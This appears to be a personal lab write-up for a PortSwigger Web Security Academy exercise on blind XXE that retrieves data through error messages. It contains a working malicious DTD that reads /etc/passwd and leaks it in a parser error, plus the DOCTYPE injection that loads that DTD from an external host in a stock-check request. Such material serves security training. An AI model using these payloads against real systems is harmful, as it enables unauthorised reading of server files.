# [Exploiting blind XXE to retrieve data via error messages](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages)

> creating a .dtd file on the server and reference that in store request

- create a `XML DTD (Document Type Definition)` on the server (it is already there)
- add this to the body

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

> description

- `% file` - reads /etc/passwd into a parameter entity

- `% eval` - it dynamically defines a new entity (`% exfil`) whose SYSTEM identifier is `file:///invalid/` + the contents of `% file`, but can't directly nest `% file` inside another entity's SYSTEM URL in one step, so you use this two-stage trick where `% eval` builds the entity definition as a string, substituting `% file` into it first

- `%eval;` - this actually declares the `%exfil` entity (now containing the real passwd content baked into a URL)

- `%exfil;` - this triggers the parser to try to fetch `file:///invalid/root:x:0:0:...` (an invalid path, because /etc/passwd contents got jammed into the path). This fails, and the resulting error message includes that bogus path - which contains your file's contents

- in burp suite open the page and check the stock `/product/stock`
- sent the request to the repeater
- add this to the request:

```xml
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "https://xxx/exploit.dtd"> %xxe;
]>
```

- it should look like this

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "https://xxx/exploit.dtd"> %xxe;
]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

- send the request
